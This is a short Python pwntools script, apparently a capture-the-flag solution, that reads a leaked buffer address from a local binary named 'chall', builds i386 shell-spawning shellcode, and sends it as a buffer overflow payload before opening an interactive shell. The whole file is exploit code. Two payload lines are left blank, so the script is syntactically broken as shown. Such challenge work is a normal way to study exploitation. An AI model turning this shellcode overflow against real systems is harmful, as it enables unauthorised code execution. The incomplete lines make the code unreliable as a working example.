#!/usr/bin/python3
#-*-coding:utf-8-*-

from pwn import *


target = process('./chall')

# address
_ = target.readuntil("buf = ") 
buf_addr = int(target.readline(), 16)
print("buf addr : 0x{:x}".format(buf_addr))

# shellcode
shellcode = asm(pwnlib.shellcraft.i386.linux.sh())

# payload
payload = shellcode
payload += b"A" * 
payload += 

_ = target.readline()
target.sendline(payload)

target.interactive()
    

